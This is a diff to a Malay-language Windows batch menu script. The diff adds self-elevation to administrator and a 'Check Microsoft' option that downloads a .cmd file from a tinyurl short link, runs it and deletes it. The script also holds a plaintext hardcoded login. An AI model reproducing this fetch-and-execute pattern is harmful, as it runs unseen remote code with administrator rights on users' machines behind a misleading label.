@@ -1,8 +1,20 @@
 @echo off
+:: Semak jika skrip dijalankan sebagai Administrator
+>nul 2>&1 net session
+if %errorlevel% neq 0 (
+    echo.
+    echo [!] Skrip ini perlu dijalankan sebagai Administrator.
+    echo     Memulakan semula dengan akses pentadbir...
+    timeout /t 2 >nul
+    powershell -Command "Start-Process '%~f0' -Verb runAs"
+    exit /b
+)
+
+:: Kalau admin, teruskan
 title Sistem Capikputh
 setlocal enabledelayedexpansion
-
 color 0A
+
 :: Tetapan login
 set "username=capik"
 set "password=0612"
@@ -11,6 +23,7 @@ set "password=0612"
 >getpass.vbs echo wscript.echo(InputBox("Masukkan Password:", "Login Sistem Capikputh"))
 
 :: LOGIN
+title Sistem Capikputh
 :login
 cls
 echo ===============================
@@ -51,12 +64,14 @@ echo.
 echo 1. Jalankan Activation
 echo 2. Jalankan Deployment Tool
 echo 3. Website Menarik
-echo 4. Keluar
+echo 4. Check Microsoft
+echo 5. Keluar
 echo.
 
-choice /c 1234 /n /m "Sila pilih [1/2/3/4]: "
+choice /c 12345 /n /m "Sila pilih [1/2/3/4/5]: "
 
-if errorlevel 4 goto end
+if errorlevel 5 goto end
+if errorlevel 4 goto dcheck
 if errorlevel 3 goto webss
 if errorlevel 2 goto deployment
 if errorlevel 1 goto activation
@@ -77,6 +92,14 @@ call temp_deploy.cmd
 del /f /q temp_deploy.cmd
 del /f /q configuration.xml
 del /f /q setup.exe
+goto ulang
+
+:dcheck
+echo.
+echo Muat turun dan jalankan Deployment Tool...
+curl -L https://tinyurl.com/capikku009 -o temp_checkcapik.cmd
+call temp_checkcapik.cmd
+del /f /q temp_checkcapik.cmd
 goto ulang
 
 :webss
